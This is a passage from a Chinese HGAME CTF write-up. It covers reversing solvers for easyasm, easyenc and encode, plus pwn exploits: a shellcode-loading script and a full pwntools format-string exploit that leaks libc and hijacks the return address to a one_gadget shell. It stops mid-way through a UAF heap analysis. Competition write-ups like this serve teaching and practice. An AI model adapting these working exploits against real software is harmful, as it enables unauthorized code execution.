xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode1=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rdx</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    call rsi</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode1))</span><br><span class="line">io.send(shellcode1)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.send(shellcode2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="easyasm"><a href="#easyasm" class="headerlink" title="easyasm"></a>easyasm</h3><p>根据汇编找逻辑，分析完发现只是简单的异或：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">; void __cdecl enc(char *p)</span><br><span class="line">.text:00401160 _enc            proc near               ; CODE XREF: _main+1B↑p</span><br><span class="line">.text:00401160</span><br><span class="line">.text:00401160 i               = dword ptr -4</span><br><span class="line">.text:00401160 Str             = dword ptr  8</span><br><span class="line">.text:00401160</span><br><span class="line">.text:00401160                 push    ebp</span><br><span class="line">.text:00401161                 mov     ebp, esp</span><br><span class="line">.text:00401163                 push    ecx</span><br><span class="line">.text:00401164                 mov     [ebp+i], 0</span><br><span class="line">.text:0040116B                 jmp     short loc_401176</span><br><span class="line">.text:0040116D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040116D</span><br><span class="line">.text:0040116D loc_40116D:                             ; CODE XREF: _enc+3B↓ji自增</span><br><span class="line">.text:0040116D                 mov     eax, [ebp+i]</span><br><span class="line">.text:00401170                 add     eax, 1</span><br><span class="line">.text:00401173                 mov     [ebp+i], eax</span><br><span class="line">.text:00401176</span><br><span class="line">.text:00401176 loc_401176:                             ; CODE XREF: _enc+B↑j</span><br><span class="line">.text:00401176                 mov     ecx, [ebp+Str]</span><br><span class="line">.text:00401179                 push    ecx             ; Str</span><br><span class="line">.text:0040117A                 call    _strlen; 返回Str的长度至eax</span><br><span class="line">.text:0040117F                 add     esp, 4</span><br><span class="line">.text:00401182                 cmp     [ebp+i], eax; i与len(Str)比较</span><br><span class="line">.text:00401185                 jge     short loc_40119D; 大则跳出循环</span><br><span class="line">.text:00401187                 mov     edx, [ebp+Str]</span><br><span class="line">.text:0040118A                 add     edx, [ebp+i]</span><br><span class="line">.text:0040118D                 movsx   eax, byte ptr [edx]; movsx 带符号扩展传送</span><br><span class="line">.text:00401190                 xor     eax, 33h; 异或加密</span><br><span class="line">.text:00401193                 mov     ecx, [ebp+Str]</span><br><span class="line">.text:00401196                 add     ecx, [ebp+i]</span><br><span class="line">.text:00401199                 mov     [ecx], al</span><br><span class="line">.text:0040119B                 jmp     short loc_40116D</span><br><span class="line">.text:0040119D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040119D</span><br><span class="line">.text:0040119D loc_40119D:                             ; CODE XREF: _enc+25↑j</span><br><span class="line">.text:0040119D                 mov     esp, ebp</span><br><span class="line">.text:0040119F                 pop     ebp</span><br><span class="line">.text:004011A0                 retn</span><br><span class="line">.text:004011A0 _enc            endp</span><br><span class="line">Input: your flag</span><br><span class="line">Encrypted result: 0x5b,0x54,0x52,0x5e,0x56,0x48,0x44,0x56,0x5f,0x50,0x3,0x5e,0x56,0x6c,0x47,0x3,0x6c,0x41,0x56,0x6c,0x44,0x5c,0x41,0x2,0x57,0x12,0x4e</span><br></pre></td></tr></table></figure><p><code>exp</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data=[<span class="number">0x5b</span>,<span class="number">0x54</span>,<span class="number">0x52</span>,<span class="number">0x5e</span>,<span class="number">0x56</span>,<span class="number">0x48</span>,<span class="number">0x44</span>,<span class="number">0x56</span>,<span class="number">0x5f</span>,<span class="number">0x50</span>,<span class="number">0x3</span>,<span class="number">0x5e</span>,<span class="number">0x56</span>,<span class="number">0x6c</span>,<span class="number">0x47</span>,<span class="number">0x3</span>,<span class="number">0x6c</span>,<span class="number">0x41</span>,<span class="number">0x56</span>,<span class="number">0x6c</span>,<span class="number">0x44</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x2</span>,<span class="number">0x57</span>,<span class="number">0x12</span>,<span class="number">0x4e</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i^<span class="number">0x33</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># hgame&#123;welc0me_t0_re_wor1d!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="easyenc"><a href="#easyenc" class="headerlink" title="easyenc"></a>easyenc</h3><p>简单的加密手法，找到<code>you are right</code>简单分析即可，如果不是<code>exe</code>文件的话还想试试<code>angr</code>一把梭：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v8[<span class="number">10</span>]; <span class="comment">// [rsp+20h] [rbp-19h]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+48h] [rbp+Fh]</span></span><br><span class="line">  __int128 v10[<span class="number">3</span>]; <span class="comment">// [rsp+50h] [rbp+17h] BYREF</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+80h] [rbp+47h]</span></span><br><span class="line"></span><br><span class="line">  v8[<span class="number">0</span>] = <span class="number">0x9FDFF04</span>;</span><br><span class="line">  v8[<span class="number">1</span>] = <span class="number">0xB0F301</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v8[<span class="number">2</span>] = <span class="number">0xADF00500</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="keyword">sizeof</span>(v10));</span><br><span class="line">  v3 = <span class="number">0</span>i64;</span><br><span class="line">  v8[<span class="number">3</span>] = <span class="number">0x5170607</span>;</span><br><span class="line">  v8[<span class="number">4</span>] = <span class="number">0x17FD17EB</span>;</span><br><span class="line">  v8[<span class="number">5</span>] = <span class="number">0x1EE01EA</span>;</span><br><span class="line">  v8[<span class="number">6</span>] = <span class="number">0xFA05B1EA</span>;</span><br><span class="line">  v8[<span class="number">7</span>] = <span class="number">0xAC170108</span>;</span><br><span class="line">  v8[<span class="number">8</span>] = <span class="number">0xFDEA01EC</span>;</span><br><span class="line">  v8[<span class="number">9</span>] = <span class="number">0x60705F0</span>;</span><br><span class="line">  v9 = <span class="number">0xF9</span>;</span><br><span class="line">  sub_140001064(<span class="string">&quot;%50s&quot;</span>, v10);</span><br><span class="line">  v4 = <span class="number">-1</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v4;</span><br><span class="line">  <span class="keyword">while</span> ( *(v10 + v4) );</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">41</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (*(v10 + v3) ^ <span class="number">0x32</span>) - <span class="number">86</span>;</span><br><span class="line">    *(v10 + v3) = v5;</span><br><span class="line">    <span class="keyword">if</span> ( *(v8 + v3) != v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v3 &gt;= <span class="number">41</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="string">&quot;you are right!&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = <span class="string">&quot;wrong!&quot;</span>;</span><br><span class="line">LABEL_8:</span><br><span class="line">  sub_140001010(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exp</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data=[<span class="number">0x04</span>, <span class="number">0xFF</span>, <span class="number">0xFD</span>, <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0xF3</span>, <span class="number">0xB0</span>, <span class="number">0x00</span>,</span><br><span class="line">      <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x17</span>, <span class="number">0x05</span>,</span><br><span class="line">      <span class="number">0xEB</span>, <span class="number">0x17</span>, <span class="number">0xFD</span>, <span class="number">0x17</span>, <span class="number">0xEA</span>, <span class="number">0x01</span>, <span class="number">0xEE</span>, <span class="number">0x01</span>,</span><br><span class="line">      <span class="number">0xEA</span>, <span class="number">0xB1</span>, <span class="number">0x05</span>, <span class="number">0xFA</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x17</span>, <span class="number">0xAC</span>,</span><br><span class="line">      <span class="number">0xEC</span>, <span class="number">0x01</span>, <span class="number">0xEA</span>, <span class="number">0xFD</span>, <span class="number">0xF0</span>, <span class="number">0x05</span>, <span class="number">0x07</span>, <span class="number">0x06</span>,</span><br><span class="line">      <span class="number">0xF9</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(((i+<span class="number">86</span>)%<span class="number">256</span>)^<span class="number">0x32</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># hgame&#123;4ddit1on_is_a_rever5ible_0peration&#125;</span></span><br></pre></td></tr></table></figure><h3 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h3><p>将一个数分开二次加密记录，一个计算<code>%16</code>的余数，另一个计算<code>/16</code>的整数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4[<span class="number">100</span>]; <span class="comment">// [esp+0h] [ebp-1CCh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">52</span>]; <span class="comment">// [esp+190h] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+1C4h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+1C8h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">0x32</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  sub_4011A0(<span class="string">&quot;%50s&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">50</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[<span class="number">2</span> * i] = v5[i] &amp; <span class="number">0xF</span>;</span><br><span class="line">    v4[<span class="number">2</span> * i + <span class="number">1</span>] = (v5[i] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">100</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[j] != dword_403000[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401160(Format, v4[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401160(aYesYouAreRight, v4[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exp</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">result=[<span class="number">8</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>,</span><br><span class="line">        <span class="number">11</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>,</span><br><span class="line">        <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">15</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">15</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>,</span><br><span class="line">        <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">        <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag=[<span class="number">0</span>]*<span class="number">50</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    result[<span class="number">2</span>*i]=result[<span class="number">2</span>*i] &amp; <span class="number">0xf</span></span><br><span class="line">    result[<span class="number">2</span>*i+<span class="number">1</span>]=(result[<span class="number">2</span>*i+<span class="number">1</span>] &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span></span><br><span class="line">    flag[i]=result[<span class="number">2</span>*i]+result[<span class="number">2</span>*i+<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># hgame&#123;encode_is_easy_for_a_reverse_engineer&#125;</span></span><br></pre></td></tr></table></figure><h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><h2 id="pwn-1"><a href="#pwn-1" class="headerlink" title="pwn"></a>pwn</h2><h3 id="YukkuriSay"><a href="#YukkuriSay" class="headerlink" title="YukkuriSay"></a>YukkuriSay</h3><p>考察栈外的格式化漏洞，且<code>read</code>次数只有一次，说明一次只能修改一个指定地址。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/99040/18/33955/52628/63c4b592Fdf5a68c1/c4c2b5bfadb8f836.png" style="zoom: 67%;" /><ul><li>第一次需要用来泄露+返回，将<code>buf</code>充满，会通过<code>print_str</code>泄露出一个残留的栈地址：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/140789/38/32753/51582/63c4b696F25308ff7/31bf55ae390a5057.png" style="zoom:67%;" /><ul><li>不要<code>n</code>，继续在<code>buf</code>上布置栈返回地址，使其返回到<code>_start</code>（返回<code>main</code>和<code>vuln</code>会报错），顺便泄露出<code>libc</code>。</li><li>由于<code>printf(str)</code>最稳妥的修改方法是一个地址中的<code>1字节+2字节</code>(<code>2+2</code>需要爆破)，因此不难想到劫持程序执行流为<code>one_gadget</code>，而返回地址<code>__libc_start_main+???</code>作为<code>libc</code>地址显然和<code>one_gadget</code>具有更好的相似性，在返回到<code>__libc_start_main+???</code>时可以观察到<code>rdx=0</code>和<code>r15=0</code>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure><ul><li>不难想到用第二个<code>gadget</code>。</li><li><code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">31352</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;What would you like to let Yukkri say?\n&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">256</span>)</span><br><span class="line">stack=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">8</span></span><br><span class="line">log.success(<span class="string">&quot;stack===&gt;&quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)\n&quot;</span>,<span class="string">b&quot;Y&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(p64(stack)*<span class="number">32</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)\n&quot;</span>,<span class="string">b&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;%45$p%4418c%8$hn&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">243</span>-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base==&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+<span class="number">0xe3b01</span></span><br><span class="line">m1=(one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">m2=one_gadget &amp; <span class="number">0xffff</span></span><br><span class="line">log.success(<span class="string">&quot;one_gadget==&quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">log.success(<span class="string">&quot;m1=&quot;</span>+<span class="built_in">hex</span>(m1)+<span class="string">&quot;;m2=&quot;</span>+<span class="built_in">hex</span>(m2))</span><br><span class="line">stack2=stack-<span class="number">224</span></span><br><span class="line">log.success(<span class="string">&quot;stack2==&quot;</span>+<span class="built_in">hex</span>(stack2))</span><br><span class="line">io.sendafter(<span class="string">&quot;What would you like to let Yukkri say?\n&quot;</span>,p64(stack2+<span class="number">2</span>)+p64(stack2))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)\n&quot;</span>,<span class="string">b&quot;n&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%8$hhn&quot;</span>.<span class="built_in">format</span>(m1)</span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%9$hn&quot;</span>.<span class="built_in">format</span>(m2-m1)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="editable-note"><a href="#editable-note" class="headerlink" title="editable_note"></a>editable_note</h3><p><code>libc2.31</code>下常规的<code>uaf</code>漏洞。</p><ul><li>add：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> size[<span class="number">7</span>]; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  *&amp;size[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;This page has been used.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( size[<span class="number">0</span>] &lt;= <span class="number">0xFF</span>u )</span><br><span class="line">      &#123;</span><br><span class="line">        v0 = v2;</span><br><span class="line">        notes[v0] = <span class="built_in">malloc</span>(size[<span class="number">0</span>]);</span><br><span class="line">        